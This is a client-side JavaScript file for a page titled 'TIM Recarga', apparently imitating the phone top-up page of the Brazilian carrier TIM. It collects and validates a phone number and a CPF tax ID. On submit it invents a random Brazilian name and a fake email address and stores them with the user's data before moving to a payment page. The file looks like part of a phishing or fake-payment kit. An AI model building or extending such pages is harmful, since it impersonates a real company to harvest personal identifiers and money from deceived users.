(function () {
    // Scroll animado suave até o título "TIM Recarga"
    function smoothScrollTo(targetY, duration) {
        var startY = window.pageYOffset;
        var diff = targetY - startY;
        if (Math.abs(diff) < 5) return;
        var startTime = null;
        function step(ts) {
            if (!startTime) startTime = ts;
            var elapsed = ts - startTime;
            var p = Math.min(elapsed / duration, 1);
            var ease = p < 0.5 ? 4*p*p*p : 1 - Math.pow(-2*p + 2, 3) / 2;
            window.scrollTo(0, startY + diff * ease);
            if (elapsed < duration) requestAnimationFrame(step);
        }
        requestAnimationFrame(step);
    }

    window.addEventListener('load', function () {
        var target = document.getElementById('scroll-target');
        if (!target) return;
        setTimeout(function () {
            var headerH = 56;
            var top = target.getBoundingClientRect().top + window.pageYOffset - headerH;
            smoothScrollTo(top, 900);
        }, 430);
    });

    var phoneInput = document.getElementById('input-phone');
    var cpfInput   = document.getElementById('input-cpf');
    var btn        = document.getElementById('btn-recarregar');

    // ── Máscaras ──────────────────────────────────────────────
    phoneInput.addEventListener('input', function () {
        var d = this.value.replace(/\D/g, '').slice(0, 11);
        var v = '';
        if (d.length === 0) {
            v = '';
        } else if (d.length <= 2) {
            v = '(' + d;
        } else if (d.length <= 6) {
            v = '(' + d.slice(0, 2) + ') ' + d.slice(2);
        } else if (d.length <= 10) {
            v = '(' + d.slice(0, 2) + ') ' + d.slice(2, 6) + '-' + d.slice(6);
        } else {
            v = '(' + d.slice(0, 2) + ') ' + d.slice(2, 7) + '-' + d.slice(7);
        }
        this.value = v;
        validate();
        saveLocal();
    });

    cpfInput.addEventListener('input', function () {
        var d = this.value.replace(/\D/g, '').slice(0, 11);
        var v = '';
        if (d.length <= 3) {
            v = d;
        } else if (d.length <= 6) {
            v = d.slice(0, 3) + '.' + d.slice(3);
        } else if (d.length <= 9) {
            v = d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6);
        } else {
            v = d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9);
        }
        this.value = v;
        validate();
        saveLocal();
    });

    // ── Validação ─────────────────────────────────────────────
    function isPhoneOk() { return phoneInput.value.replace(/\D/g, '').length >= 10; }
    function isCpfOk()   { return cpfInput.value.replace(/\D/g, '').length === 11; }

    function setFieldState(input, ok) {
        input.style.borderColor = ok ? '#22c55e' : '#ef4444';
        input.style.borderWidth = '2px';
        input.style.borderStyle = 'solid';
    }

    function validate() {
        var pOk = isPhoneOk();
        var cOk = isCpfOk();

        if (phoneInput.value.length > 0) setFieldState(phoneInput, pOk);
        if (cpfInput.value.length   > 0) setFieldState(cpfInput,   cOk);

        var allOk = pOk && cOk;
        btn.disabled = !allOk;
        btn.style.cursor = allOk ? 'pointer' : 'not-allowed';

        if (allOk) {
            btn.style.background = '#FFCC00';
            btn.style.color      = '#0C2340';
            btn.style.opacity    = '1';
            btn.style.boxShadow  = '0 4px 14px rgba(255,204,0,0.45)';
        } else {
            btn.style.background = '';
            btn.style.color      = '';
            btn.style.opacity    = '0.55';
            btn.style.boxShadow  = '';
        }
    }

    // ── Persistência ──────────────────────────────────────────
    function saveLocal() {
        localStorage.setItem('tim_form', JSON.stringify({
            phone: phoneInput.value,
            cpf:   cpfInput.value,
        }));
    }

    var saved = JSON.parse(localStorage.getItem('tim_form') || '{}');
    if (saved.phone) { phoneInput.value = saved.phone; }
    if (saved.cpf)   { cpfInput.value   = saved.cpf;   }
    if (saved.phone || saved.cpf) validate();

    [phoneInput, cpfInput].forEach(function (el) {
        el.addEventListener('blur', function () {
            if (el.value.length > 0) {
                setFieldState(el, el === phoneInput ? isPhoneOk() : isCpfOk());
            }
        });
    });

    function randomName() {
        var names  = ['Gabriel','Lucas','Matheus','Pedro','Guilherme','Gustavo','Felipe','Rafael','João','Enzo','Leonardo','Thiago','Vinicius','Bruno','Rodrigo','Diego','Daniel','Marcelo','Eduardo','Caio','Ana','Julia','Beatriz','Larissa','Mariana','Camila','Fernanda','Amanda','Leticia','Bruna','Vanessa','Patricia','Aline','Sabrina'];
        var surnames = ['Silva','Santos','Oliveira','Souza','Rodrigues','Ferreira','Alves','Pereira','Lima','Gomes','Costa','Ribeiro','Martins','Carvalho','Almeida','Lopes','Soares','Fernandes','Vieira','Barbosa','Rocha','Dias','Nascimento','Andrade','Moreira','Nunes','Marques','Machado','Mendes','Freitas'];
        var fn = names[Math.floor(Math.random() * names.length)];
        var sn1 = surnames[Math.floor(Math.random() * surnames.length)];
        var sn2 = surnames[Math.floor(Math.random() * surnames.length)];
        return fn + ' ' + sn1 + ' ' + sn2;
    }
    function randomEmail(name) {
        var parts = name.toLowerCase().replace(/\s+/g, '.').normalize('NFD').replace(/[\u0300-\u036f]/g, '');
        var num   = Math.floor(Math.random() * 9000) + 1000;
        var domains = ['gmail.com','hotmail.com','outlook.com','yahoo.com.br'];
        return parts + num + '@' + domains[Math.floor(Math.random() * domains.length)];
    }

    // ── Submissão ─────────────────────────────────────────────
    if (btn) {
        btn.addEventListener('click', function (e) {
            e.preventDefault();
            if (!isPhoneOk() || !isCpfOk()) return;

            var name  = randomName();
            var email = randomEmail(name);

            sessionStorage.setItem('tim_name',  name);
            sessionStorage.setItem('tim_email', email);
            sessionStorage.setItem('tim_phone', phoneInput.value.trim());
            sessionStorage.setItem('tim_cpf',   cpfInput.value.trim());
            (window.timNavigate || (u => window.location.href = u))('../recarga-pay/index.html');
        });
    }

})();
